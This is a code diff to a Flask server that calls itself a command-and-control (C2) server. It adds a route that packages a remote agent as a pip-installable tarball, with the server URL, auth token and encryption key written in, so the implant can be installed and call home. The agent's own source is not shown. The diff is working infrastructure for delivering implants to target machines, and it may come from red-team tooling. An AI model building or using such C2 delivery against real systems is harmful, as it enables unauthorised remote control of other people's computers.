@@ -2547,6 +2547,58 @@ def serve_agent(filename):
                                    f'ENC_KEY    = os.environ.get("ENC_KEY",    "{enc_key}")')
     return Response(content, mimetype="text/plain")
 
+
+@app.route("/package/c2agent.tar.gz")
+def serve_pip_package():
+    """Serve pip-installable package directly from C2 server."""
+    import tarfile
+    import io as io_module
+    
+    server_url = _get_public_url() or f"{request.scheme}://{request.host}"
+    token = get_config("agent_token") or ""
+    enc_key = get_config("encryption_key") or ""
+    
+    # Create in-memory tar.gz package
+    tar_buffer = io_module.BytesIO()
+    
+    with tarfile.open(fileobj=tar_buffer, mode='w:gz') as tar:
+        # setup.py
+        setup_content = f'''from setuptools import setup
+setup(
+    name="c2agent",
+    version="1.0.0",
+    py_modules=["c2agent"],
+    entry_points={{
+        "console_scripts": ["c2agent=c2agent:main"],
+    }},
+)
+'''
+        setup_info = tarfile.TarInfo(name="setup.py")
+        setup_info.size = len(setup_content.encode())
+        tar.addfile(setup_info, io_module.BytesIO(setup_content.encode()))
+        
+        # c2agent.py (universal agent)
+        agent_path = BASE_DIR / "src" / "agents" / "universal.py"
+        agent_content = agent_path.read_text()
+        agent_content = agent_content.replace("http://CHANGE_ME:443", server_url)
+        if token:
+            agent_content = agent_content.replace('AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")',
+                                                   f'AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "{token}")')
+        if enc_key:
+            agent_content = agent_content.replace('ENC_KEY = os.environ.get("ENC_KEY", "")',
+                                                   f'ENC_KEY = os.environ.get("ENC_KEY", "{enc_key}")')
+        
+        agent_info = tarfile.TarInfo(name="c2agent.py")
+        agent_info.size = len(agent_content.encode())
+        tar.addfile(agent_info, io_module.BytesIO(agent_content.encode()))
+    
+    tar_buffer.seek(0)
+    return Response(
+        tar_buffer.getvalue(),
+        mimetype="application/gzip",
+        headers={"Content-Disposition": "attachment; filename=c2agent.tar.gz"}
+    )
+
 # ──────────────────────── API: AGENTS ────────────────────────
 
 @app.route("/api/agent/register", methods=["POST"])
